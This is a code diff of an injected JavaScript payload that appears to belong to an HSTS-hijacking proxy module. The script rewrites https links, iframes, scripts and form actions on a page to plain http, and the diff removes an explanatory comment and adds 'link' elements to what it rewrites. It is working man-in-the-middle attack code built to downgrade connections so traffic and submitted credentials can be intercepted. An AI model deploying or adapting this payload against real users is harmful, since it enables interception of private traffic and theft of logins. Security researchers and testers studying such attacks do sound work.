@@ -1,12 +1,3 @@
-/*
-  Hooks XMLHttpRequest as well as 'a', 'form', 'script' & 'iframe' nodes.
-
-  Remember that any occurrence of 'obf_hstshijack_path_ssl_log', 'obf_hstshijack_path_callback' and
-  'obf_hstshijack_path_whitelist' in this payload will be replaced when the proxy module
-  loads and that variable names 'obf_hstshijack_var_target_hosts' and 'obf_hstshijack_var_replacement_hosts'
-  are already declared before this is injected.
-*/
-
 (function(){
   "use strict";
 
@@ -26,7 +17,7 @@
   }
 
   function obf_hstshijack_func_hook_nodes() {
-    document.querySelectorAll("a,iframe,script,form").forEach(function(obf_hstshijack_var_node){
+    document.querySelectorAll("a,iframe,script,form,link").forEach(function(obf_hstshijack_var_node){
       try {
         switch (obf_hstshijack_var_node.tagName) {
           case "A":
@@ -47,6 +38,11 @@
           case "FORM":
             if (obf_hstshijack_var_node.action && obf_hstshijack_var_node.action.match(/^\s*https:/i)) {
               obf_hstshijack_var_node.action = obf_hstshijack_var_node.action.replace(/(http)s/i, "$1");
+            }
+            break;
+          case "LINK":
+            if (obf_hstshijack_var_node.href && obf_hstshijack_var_node.href.match(/^\s*https:/i)) {
+              obf_hstshijack_var_node.href = obf_hstshijack_var_node.href.replace(/(http)s/i, "$1");
             }
             break;
         }
